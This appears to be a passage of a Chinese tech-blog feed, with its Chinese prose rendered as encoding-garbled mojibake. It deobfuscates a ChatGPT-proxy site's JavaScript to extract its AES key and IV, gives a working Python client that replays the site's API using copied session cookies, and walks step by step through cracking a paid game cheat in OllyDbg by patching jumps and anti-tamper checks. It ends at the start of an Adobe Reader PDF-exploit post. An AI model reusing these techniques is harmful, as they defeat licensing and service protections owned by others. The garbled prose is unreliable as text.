<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function P(x) &#123;</span><br><span class="line">    var zf = &#123;</span><br><span class="line">        I: 0x23,</span><br><span class="line">        P: 0x159</span><br><span class="line">    &#125;;</span><br><span class="line">    const U = CryptoJS[K(zw.I, zw.P, zw.D, 0x634)][K(zw.W, zw.y, zw.x, 0x5f7) + &#x27;8&#x27;][L(-0x172, -0x1a6, zw.U, -0x1cd) + &#x27;se&#x27;](I[K(0x4f8, zw.p, zw.f, 0x348) + &#x27;DP&#x27;]);</span><br><span class="line"></span><br><span class="line">    function K(I, P, D, W) &#123;</span><br><span class="line">        return d(P, I - zp.I, D - zp.P, W - zp.D);</span><br><span class="line">    &#125;</span><br><span class="line">    const p = CryptoJS[L(zw.w, -zw.C, &#x27;Oh0s&#x27;, -0x88)][K(0x57a, &#x27;8Xtv&#x27;, 0x689, 0x522) + &#x27;8&#x27;][L(-0x3a, -0xf1, &#x27;TyCN&#x27;, zw.k) + &#x27;se&#x27;](I[L(-0xec, 0x78, zw.N, -zw.B) + &#x27;gQ&#x27;]);</span><br><span class="line">    let f = CryptoJS[L(-0x29a, -zw.q, &#x27;!mzD&#x27;, -zw.Y)][K(zw.A, zw.zC, zw.zk, zw.zN) + &#x27;ryp&#x27; + &#x27;t&#x27;](x, U, &#123;</span><br><span class="line">        &#x27;iv&#x27;: p,</span><br><span class="line">        &#x27;mode&#x27;: CryptoJS[K(zw.zB, zw.zq, zw.zY, 0x208) + &#x27;e&#x27;][K(zw.zA, &#x27;ui19&#x27;, zw.zb, zw.zR)],</span><br><span class="line">        &#x27;padding&#x27;: CryptoJS[K(zw.zm, zw.zV, 0x600, 0x58c)][L(-zw.zM, -zw.zO, zw.zH, -0x11) + K(0x4b5, zw.zt, 0x65a, zw.zQ) + L(zw.ze, -zw.zT, zw.zl, -zw.zs) + &#x27;ng&#x27;]</span><br><span class="line">    &#125;)[&#x27;toS&#x27; + L(zw.zZ, 0x52, &#x27;AO11&#x27;, -zw.za) + &#x27;ng&#x27;]();</span><br><span class="line">    console[K(zw.zG, zw.zJ, 0x3ed, 0x48f)](f);</span><br><span class="line"></span><br><span class="line">    function L(I, P, D, W) &#123;</span><br><span class="line">        return d(D, W - -zf.I, D - 0x2b, W - zf.P);</span><br><span class="line">    &#125;</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>çœ‹åˆ°CryptoJSå…³é”®å­—å°±çŸ¥é“ï¼ŒåŸæ¥æ˜¯è€æœ‹å‹AESåŠ å¯†ï¼ŒåŠ å¯†ä»£ç ä¸€èˆ¬é•¿è¿™æ ·ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">let f = CryptoJS.AES.encrypt(data, key, &#123;</span><br><span class="line">    &#x27;iv&#x27;: iv,</span><br><span class="line">    &#x27;mode&#x27;: CryptoJS.mode.CBC,</span><br><span class="line">    &#x27;padding&#x27;: CryptoJS.pad.ZeroPadding</span><br><span class="line">&#125;).toString();</span><br></pre></td></tr></table></figure></div>

<p>å› æ­¤ï¼Œåªéœ€è¦çŸ¥é“æ˜æ–‡<code>data</code>ï¼Œåç§»é‡<code>iv</code>ï¼Œå¯†é’¥<code>key</code>ï¼ŒåŠ å¯†æ¨¡å¼<code>mode</code>å’Œ<code>padding</code>æ¨¡å¼å°±èƒ½ç®—å‡ºå¯†æ–‡</p>
<p>å°†æ··æ·†çš„ä»£ç å‡½æ•°ç‰‡æ®µæ‹–å…¥consoleä¸­è¿è¡Œï¼Œé€æ­¥å¾—åˆ°å…³é”®ä¿¡æ¯ï¼Œå°†ä»£ç ç®€åŒ–åå¯ä»¥å¾—åˆ°ï¼š</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function P(x) &#123;</span><br><span class="line">    const U = CryptoJS.enc.Utf8.parse(&#x27;y~.,ZaabH6Ri?L7*&#x27;);</span><br><span class="line">    const p = CryptoJS.enc.Utf8.parse(&#x27;koJ)KZhR1RW)!_~M&#x27;);</span><br><span class="line">    let f = CryptoJS.AES.encrypt(x, U, &#123;</span><br><span class="line">        &#x27;iv&#x27;: p,</span><br><span class="line">        &#x27;mode&#x27;: CryptoJS.mode.CBC,</span><br><span class="line">        &#x27;padding&#x27;: CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;).toString();</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ ·å°±ä¸€ç›®äº†ç„¶äº†ï¼Œä»¥æ­¤å³å¯å¤ç°æ•´ä¸ªé—®ç­”æµç¨‹</p>
<h2 id="è„šæœ¬å¤ç°"><a href="#è„šæœ¬å¤ç°" class="headerlink" title="è„šæœ¬å¤ç°"></a>è„šæœ¬å¤ç°</h2><p>æœ‰äº†åŠ å¯†æ–¹å¼ï¼Œä¾¿å°è¯•ä½¿ç”¨pythonå¤ç°è¯¥è¿‡ç¨‹ï¼Œ</p>
<p>æ‰€éœ€åº“ï¼š</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">requests</span><br><span class="line">BeautifulSoup4</span><br><span class="line">pycryptodome</span><br></pre></td></tr></table></figure></div>

<p>å®Œæ•´ä»£ç ï¼š</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prompt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&quot;y~.,ZaabH6Ri?L7*&quot;</span>.zfill(<span class="number">16</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    iv = <span class="string">&quot;koJ)KZhR1RW)!_~M&quot;</span>.zfill(<span class="number">16</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    temp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    data = text.encode()</span><br><span class="line">    data = data + <span class="string">&quot;\0&quot;</span>.encode() * (<span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(data) / <span class="number">16</span>)):</span><br><span class="line">        block = data[<span class="number">16</span> * i: <span class="number">16</span> * (i + <span class="number">1</span>)]</span><br><span class="line">        b = cipher.encrypt(block)</span><br><span class="line">        temp += b</span><br><span class="line">    res = base64.b64encode(temp).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">pro, his</span>):</span><br><span class="line">    url = <span class="string">&quot;https://gpt.tool00.com/api/v1/chat/submit&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;_ga=GA1.1.800331461.1681885375; FCNEC=%5B%5B%22AKsRol9hmarvKjjCFyL8FNDRa4pULxPROMocI7VYSD0RbFdjyJTZC7l-bg8X9jiqb_sgT20JjKZUcByZcxCISeOtpn6yrS-MfP7fBKq_bnxmfgqatIjGyGj94fs7mzCuRdhlqjb3wptJRkxJW7PtMVyBrDHMULZplA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; __gads=ID=687486c546a2283f-22c4ae5397e0000b:T=1683182853:RT=1683182853:S=ALNI_MZCmtWOxQGyc3bhufEj8nnhyv6Pqg; __gpi=UID=00000c01738ff6e2:T=1683182853:RT=1683182853:S=ALNI_MZfy93-Hs1rY1R4PPrdQzg6CqPS3w; _ga_60RX9FESNC=GS1.1.1683187497.3.0.1683187497.0.0.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://gpt.tool00.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://gpt.tool00.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;prompt&quot;</span>: pro,</span><br><span class="line">        <span class="string">&quot;his&quot;</span>: his</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, headers=headers, data=json.dumps(data))</span><br><span class="line">    session = re.search(<span class="string">&quot;[0-9a-z]&#123;8&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;4&#125;-[0-9a-z]&#123;12&#125;&quot;</span>, r.headers[<span class="string">&quot;set-cookie&quot;</span>])</span><br><span class="line">    <span class="keyword">return</span> session.group()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">session</span>):</span><br><span class="line">    url = <span class="string">&quot;https://gpt.tool00.com/api/v1/chat/stream&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cache-control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;_ga=GA1.1.800331461.1681885375; FCNEC=%5B%5B%22AKsRol9hmarvKjjCFyL8FNDRa4pULxPROMocI7VYSD0RbFdjyJTZC7l-bg8X9jiqb_sgT20JjKZUcByZcxCISeOtpn6yrS-MfP7fBKq_bnxmfgqatIjGyGj94fs7mzCuRdhlqjb3wptJRkxJW7PtMVyBrDHMULZplA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; __gads=ID=687486c546a2283f-22c4ae5397e0000b:T=1683182853:RT=1683182853:S=ALNI_MZCmtWOxQGyc3bhufEj8nnhyv6Pqg; __gpi=UID=00000c01738ff6e2:T=1683182853:RT=1683182853:S=ALNI_MZfy93-Hs1rY1R4PPrdQzg6CqPS3w; _ga_60RX9FESNC=GS1.1.1683187497.3.0.1683187497.0.0.0; session=&quot;</span> + session,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://gpt.tool00.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://gpt.tool00.com/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    b = bs(r.content, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    extr = re.findall(<span class="string">&#x27;&quot;content&quot;: &quot;.*&quot;&#x27;</span>, <span class="built_in">str</span>(b))</span><br><span class="line">    ans = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> <span class="built_in">enumerate</span>(extr):</span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">1</span>:</span><br><span class="line">            ans += n[<span class="number">12</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt; &quot;</span> + ans.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&#x27;unicode_escape&#x27;</span>))</span><br><span class="line"></span><br><span class="line">history = []</span><br><span class="line"><span class="keyword">while</span> (text := <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt; &quot;</span>)):</span><br><span class="line">    <span class="keyword">if</span> text != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        stream(submit(prompt(text), history))</span><br><span class="line">        history.append(text)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

]]></content>
  </entry>
  <entry>
    <title>å¦‚ä½•ç»•è¿‡è½¯ä»¶æ”¶è´¹</title>
    <url>/2023/05/13/%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E8%BD%AF%E4%BB%B6%E6%94%B6%E8%B4%B9/</url>
    <content><![CDATA[<h2 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h2><p><strong>æˆ‘çš„ä¸€ä½æœ‹å‹</strong>å†³å®šåœ¨ç½‘ä¸Šè´­ä¹°ä¸€ä¸ªæ¸¸æˆè¾…åŠ©ï¼Œä»¥æé«˜è‡ªå·±åœ¨æ¸¸æˆä¸­çš„è¡¨ç°ã€‚ä»–å‘ç°äº†ä¸€ä¸ªä»·æ ¼ç›¸å¯¹ä¾¿å®œçš„å–å®¶ï¼Œäºæ˜¯ç«‹å³ä¸‹å•è´­ä¹°äº†è¯¥è¾…åŠ©ã€‚</p>
<p><strong>ç„¶è€Œ</strong>ï¼Œå½“è¾…åŠ©åˆ°æ‰‹åï¼Œä»–å¾ˆå¿«å°±å‘ç°å®ƒè¿˜éœ€è¦é¢å¤–è´­ä¹°ç‚¹å¡ã€‚äºæ˜¯ä»–è”ç³»äº†å–å®¶ï¼Œå–å®¶å‘Šè¯‰ä»–éœ€è¦æŒ‰ç…§ä¸€å®šçš„æ–¹æ³•ä½¿ç”¨è¾…åŠ©ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™äº›æ–¹æ³•æ˜¯æ ¹æœ¬è¡Œä¸é€šçš„ã€‚</p>
<p>ä»–æƒŠéª‡åœ°å‘ç°è‡ªå·±<em><strong>è¢«éª—äº†</strong></em>ï¼Œå› ä¸ºé‚£ä¸ªå–å®¶æ—©åœ¨å–å‡ºä¹‹å‰å°±çŸ¥é“è¿™ä¸ªæ¸¸æˆè¾…åŠ©<strong>éœ€è¦é¢å¤–æ”¶è´¹</strong>ã€‚æˆ‘çš„æœ‹å‹ç»è¿‡ä¸€ç•ªåŠªåŠ›ï¼Œè¯•å›¾è¦æ±‚é€€æ¬¾ï¼Œä½†æ˜¯å–å®¶å´ä»¥å„ç§ç†ç”±æ‹’ç»äº†ä»–çš„é€€æ¬¾è¦æ±‚ã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘çš„æœ‹å‹æ‡Šæ¼ä¸‡åˆ†ã€‚ä»–çš„é’±è´¢ä»˜è¯¸ä¸œæµï¼ŒåŒæ—¶è‡ªå·±è¿˜èŠ±è´¹äº†å¾ˆå¤šæ—¶é—´å’Œç²¾åŠ›ï¼Œè€Œæœ€ç»ˆå´æ¯«æ— æ‰€è·ã€‚ä»–æ·±æ·±åœ°æ„è¯†åˆ°ï¼Œå­¦ä¹ ç ´è§£è½¯ä»¶æ˜¯å¤šä¹ˆæœ‰åŠ©äºå­¦ä¹ å’ŒæŠ€æœ¯æˆé•¿ã€‚<strong>ä»–çœŸçš„ æˆ‘å“­æ­»ğŸ˜­</strong></p>
<div class="highlight-container" data-rel="Ps"><figure class="iseeu highlight ps"><table><tr><td class="code"><pre><span class="line">ğŸ˜Šè¯·ä¸è¦åœ¨è”ç½‘æ¸¸æˆä¸­ä½¿ç”¨æ¸¸æˆè¾…åŠ©ï¼Œå®ƒä»¬é€šå¸¸ç ´åæ¸¸æˆå¹³è¡¡ï¼ŒæŸå®³ä»–äººæ¸¸æˆä½“éªŒæˆ–è€…å¯¼è‡´è‡ªå·±è´¦å·è¢«å°ã€‚</span><br><span class="line">ğŸ˜˜ä¿æŒæ¸¸æˆçš„å…¬æ­£ä¸ä¹è¶£ï¼Œè¿œç¦»æ¸¸æˆè¾…åŠ©ï¼</span><br><span class="line">        ğŸ¤œä»»ä½•é‚ªæ¶ ç»ˆå°†è¢«ç»³ä¹‹ä»¥æ³•ğŸ¤›</span><br></pre></td></tr></table></figure></div>

<h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><p>æŠŠæ¸¸æˆè¾…åŠ©æ‹–è¿›PeidæŸ¥å£³,å—¯ æ— å£³ ï¼Œè¾…åŠ©ä½œè€…æ¯”è¾ƒè‡ªä¿¡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/BrpXZL29.png"
                     
                ></p>
<p>ä¸å¤šbbï¼Œæ‹–è¿›OllyDBGå¼€æ(æˆ–è€…X64dbg)ï¼Œè¯•ç€è¿è¡Œä¸€ä¸‹å­ï¼Œç‚¹å‡»ç™»å½•ï¼Œå‡ºç°ä¸€ä¸ªå¼¹çª—</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/EAf52t7Z.png"
                     
                ></p>
<p>å³é”®å°è¯•æœç´¢ä¸‹å­—ç¬¦ä¸²å‘ç°æœ‰â€œåŠ å…¥é»‘åå•â€ï¼Œå…ˆè¿›å»ä¸‹å‡ ä¸ªæ–­ç‚¹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/SifhWiCl.png"
                     
                ></p>
<p>å¾€ä¸‹ç¿»  å‘ç°è¾…åŠ©ä½œè€…</p>
<p><strong>å¾ˆæ²¡ç´ è´¨</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/DIzLAbVx.png"
                     
                ></p>
<p>å› ä¸ºæœ‰å¼¹çª—ï¼Œæ‰€ä»¥ç›´æ¥ä¸‹ä¸€ä¸ªå¼¹çª—ä½“çš„æ–­ç‚¹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/jQdyLfk5.png"
                     
                ></p>
<p>ç™»é™†æ–­ä¸‹æ¥äº†ï¼Œå› ä¸ºæ˜¯ç³»ç»Ÿé¢†ç©º</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/gBqetTP0.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/hqXflFOF.png"
                     
                ></p>
<p>å³ä¸‹è§’çª—å£å¤„æœ‰ä¸ª â€è¿”å›åˆ°â€œ å³é”®å®ƒ â€åæ±‡ç¼–çª—å£è·Ÿéšâ€œ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/CHyGMoJ7.png"
                     
                ></p>
<p>è¯´æ˜åˆšåˆšä»ä¸Šé¢è¿™ä¸ªcallå‡ºæ¥ï¼Œè¿™ä¸ªcallå°±æ˜¯å¼¹å‡ºå¯†ç é”™è¯¯çš„callï¼Œè¯´æ˜éªŒè¯è‚¯å®šåœ¨å‰é¢ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/MXbcmNUE.png"
                     
                ></p>
<p>è¿™ä¸æ˜¯åˆšåˆšé‚£ä¸ªéª‚äººçš„å— å¾€ä¸Šä¸€ç¿» è¿˜çœŸæ˜¯ï¼Œè¿™ä¸ªé”™è¯¯callä¸Šé¢æœ‰jmpå¯ä»¥è·³è¿‡</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/42Z962on.png"
                     
                ></p>
<p>å…ˆå¾€ä¸Šçœ‹çœ‹å®ƒæ€ä¹ˆèµ°çš„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/MaCRHrrY.png"
                     
                ></p>
<p>è¿™é‡Œå³å¥è½¬åˆ°ä¸Šé¢çš„è·³è½¬00414AB7</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/G3hj50Yu.png"
                     
                ></p>
<p>åœ¨è¿™é‡Œä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åæŠŠåˆšåˆšä¸‹çš„çª—å£æ–­ç‚¹åˆ é™¤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/iNtbZi4r.png"
                     
                ></p>
<p>å·²ç»æ²¡ç”¨äº†ï¼ŒF9è¿è¡Œè½¯ä»¶ï¼Œç‚¹å‡»ç™»å½•ï¼Œæ–­ä½äº†</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/13/LWDtMhre.png"
                     
                ></p>
<p>ä¸èƒ½è®©ä»–ä¸‹å» ä¸ç„¶ä¸å°±å›åˆ°é”™è¯¯calläº† ç›´æ¥nopæ‰</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/JDvqdjxA.png"
                     
                ></p>
<p>æ¥ç€æŒ‰f8 ä¸€æ­¥ä¸€æ­¥è·Ÿç€ï¼Œèµ°åˆ°è¿™é‡Œ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/0VsxFJLB.png"
                     
                ></p>
<p>å‘ç°ä¸€ä¸ªå¤§è·³ï¼Œåˆ°ç»ˆç‚¹çœ‹ä¸€çœ‹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/wpi7Z8ZC.png"
                     
                ></p>
<p>é˜¿è¿™  </p>
<p>è¿™è·³ä¸‹å»è¦æŒ¨éª‚äº† æ‰€ä»¥å’±ä»¬å›å» æŠŠåˆšåˆšé‚£ä¸ªè·³è½¬nopæ‰</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/usqzKd4n.png"
                     
                ></p>
<p>ç»§ç»­å¾€ä¸‹f8 èµ°åˆ°è¿™é‡Œ å†èµ°ä¸€æ­¥</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/GFEQSe0M.png"
                     
                ></p>
<p>ç¨‹åºè‡ªæ€äº†</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/skPjX1so.png"
                     
                ></p>
<p>ä¼°è®¡æ˜¯è¾…åŠ©ä½œè€…ç•™ä¸‹çš„ æš—åº„  å›åˆ°åˆšåˆšæ­»æ‰çš„ä½ç½®æ ‡è®°ä¸€ä¸‹ï¼Œä¸‹ä¸ªæ–­ç‚¹ é‡æ–°è¿è¡Œç¨‹åº æŒ‰f7è¿›è‡ªæ€call</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/lXn3thYL.png"
                     
                ></p>
<p>f8ç»§ç»­ä¸‹å» èµ°åˆ°è¿™ä¸ªcallï¼Œç¨‹åºåˆè‡ªæ€äº† åˆšå¥½ä¸Šé¢é‚£ä¸ªå¤§è·³èƒ½è·³è¿‡è¿™ä¸ªè‡ªæ€call</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/i6TIMzMI.png"
                     
                ></p>
<p>é‡æ–°è¿è¡Œåˆ°åˆšåˆšé‚£é‡Œ jgeæ”¹æˆjmp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/V0GGiXPZ.png"
                     
                ></p>
<p>ç»§ç»­f8å¾€ä¸‹ è¿™ä¸ªcallæœ‰ç‚¹çœ¼ç†Ÿé˜¿</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/zd7G6elo.png"
                     
                ></p>
<p>å¥½åƒæ˜¯ä¸Šé¢é‚£ä¸ªè‡ªæ€call  æœç„¶ä¸€æ ·</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/o0Mvd40j.png"
                     
                ></p>
<p>ç›´æ¥æ”¹æˆjmp f8ç»§ç»­å¾€ä¸‹æ¥ç€èµ°ä¸€ä¼šå„¿ï¼Œå‘ç°ä»åˆšåˆšçš„è‡ªæ€callå‡ºæ¥äº†</p>
<p>f8å†æ¥ç€å¾€ä¸‹èµ°ï¼Œç¨‹åºå°±å¼¹å‡º</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/LAVi8cqH.png"
                     
                ></p>
<h2 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h2><p>æ—¶é—´å˜æˆäº†-1ç§’ï¼Œç ´è§£åˆ°æ­¤å°±æˆåŠŸäº†ï¼Œæ‰“å¼€è½¯ä»¶åå°±å¯ä»¥ç›´æ¥è¿›å…¥è¾…åŠ©ç•Œé¢</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://img1.imgtp.com/2023/05/14/dbR5oWmq.png"
                     
                ></p>
]]></content>
  </entry>
  <entry>
    <title>å½“PDFæ¥æ•²é—¨</title>
    <url>/2023/05/22/%E5%BD%93PDF%E6%9D%A5%E6%95%B2%E9%97%A8/</url>
    <content><![CDATA[<h1 id="æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç³»åˆ—"><a href="#æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç³»åˆ—" class="headerlink" title="æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç³»åˆ—"></a>æˆ‘çš„ä¸€ä¸ªæœ‹å‹ç³»åˆ—</h1><p>å°æ—¶å€™æ‰“æ¸¸æˆè‚åˆ°ä¸€ä¸ªæ­¦å™¨è£…å¤‡(åœ¨å½“æ—¶å¾ˆå€¼é’±å—·)ï¼Œé‡åˆ°ä¸€ä¸ªäººè¯´è¦è·Ÿæˆ‘èŠèŠï¼Œäºæ˜¯ä¹ï¼Œæˆ‘å°±åœ¨QQè·ŸäººèŠå¤©ï¼Œç»“æœè¯´è¦å‘å‡ å¼ å›¾ç‰‡ç»™æˆ‘çœ‹ä»·æ ¼è¡¨(PDFæ ¼å¼)ï¼Œæˆ‘ä¿¡äº†ä»–çš„é‚ªæ¥æ”¶äº†ã€‚ç»“æœæˆ‘ä¸Šçº¿æ¸¸æˆå‡†å¤‡äº¤æ˜“ï¼ŒMDé¼ æ ‡è‡ªå·±åŠ¨äº†ï¼Œç›´æ¥æŠŠä¸œè¥¿é€ç»™äº†ä»–ï¼Œcaoï¼ŒçœŸæ¶å¿ƒå—·~</p>
<p>Soï¼Œå¦‚æœæ‰“å¼€äº†é™Œç”Ÿäººç»™ä½ å‘é€çš„æŸä¸ªä¸œè¥¿,ç”šè‡³æ˜¯ä¸ªå›¾ç‰‡,ä¸€ä¸ªpdf éƒ½ä¼šè®©ç”µè„‘ä¸çŸ¥ä¸è§‰æˆä¸ºåˆ«äººçš„è‚‰é¸¡(å°±æ˜¯åˆ«äººæƒ³å¯¹ä½ çš„ç”µè„‘å¹²å˜›å°±å¹²å˜›å•¦~)ã€‚</p>
<p>1.æ‰€éœ€ç¯å¢ƒ</p>
<ul>
<li>å—å®³è€…æ‰€å¤„æ“ä½œç³»ç»Ÿï¼šWindows XP </li>
<li>è™šæ‹Ÿæœºï¼šVMware workstation</li>
<li>åŠ¨æ€è°ƒè¯•ï¼šOllyDbg</li>
<li>é™æ€è°ƒè¯•ï¼šIDA pro</li>
<li>æ¼æ´è½¯ä»¶ï¼šAdobe Reader(ç‰ˆæœ¬å·-9.3.4)</li>
</ul>
